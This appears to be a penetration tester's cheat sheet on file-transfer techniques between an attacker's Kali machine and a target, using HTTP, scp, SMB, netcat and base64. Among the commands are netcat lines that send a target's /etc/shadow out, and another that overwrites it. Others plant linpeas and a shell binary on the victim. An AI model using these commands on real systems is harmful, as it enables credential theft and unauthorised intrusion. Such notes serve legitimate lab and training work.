# Linux

## Simple HTTP server

Python HTTP server (for file sharing):

```bash
python -m http.server 80
```

**Downloading Files**

Using `wget` or `curl` to download files:

```bash
wget http://IP/file
curl -O http://IP/file
```

Example with `curl` specifying output file:

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

***

## SCP way with authorized keys

```
scp -P 25022 -i id_rsa.txt /opt/linuxpriv/linpeas.sh alfredo@192.168.161.249:~
```


### scp download from inside ssh

start SSH server
```
sudo service ssh
sudo service ssh start 
```

my ssh starts at 2222

![[Pasted image 20240614011501.png]]

in victim
```
scp -P 2222 kali@192.168.45.214:/bin/bash /home/tom/usr/bin
```

![[Pasted image 20240614011618.png]]


-------

## **SMB File Sharing**

**On Kali (host):**

```
python /opt/impacket/examples/smbserver.py ROPNOP .
```

**On Victim (client):**

```powershell
copy \\kali-ip\ROPNOP\filename .
```

***

## **Netcat File Transfer**

Scene 1: When we have get files from other machine in our Kali

```plaintext
nc -nvlp 5555 < /etc/shadow       # On target machine MS01/HTB + enter
nc target_ip 5555 > shadow        # On our kali
```

Scene 2: When we share file to other machine from our Kali

```plaintext
nc target_ip 5555 < shadow        # it means whenever connection come share that file
nc -nvlp 5555 > /etc/shadow       # On target machine MS01/HTB + enter
```

***

## **Secure Copy Protocol (SCP)**

To copy files securely using SCP:

*   **Copy a file:**

    ```plaintext
    scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
    ```
*   **Copy a directory:**

    ```plaintext
    scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
    After
    ```

***

## base64

when blocked by firewall or cannot do anything

```bash
base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

copy generated string and paste to other

```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

